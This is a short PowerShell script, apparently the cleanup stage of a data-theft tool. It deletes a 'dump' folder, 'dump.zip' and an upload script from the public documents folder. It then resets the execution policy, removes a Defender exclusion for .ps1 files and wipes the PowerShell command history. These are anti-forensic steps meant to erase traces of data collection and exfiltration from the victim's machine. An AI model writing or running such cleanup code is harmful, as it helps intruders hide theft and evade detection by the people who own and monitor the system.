Set-Location C:\Users\Public\Documents #Go to public documents location
Remove-Item -r dump/
Remove-Item dump.zip
Remove-Item fin_upload.ps1
Set-ExecutionPolicy restricted -Force #Reset script blocker
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset antivirus exception
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear powershell command history
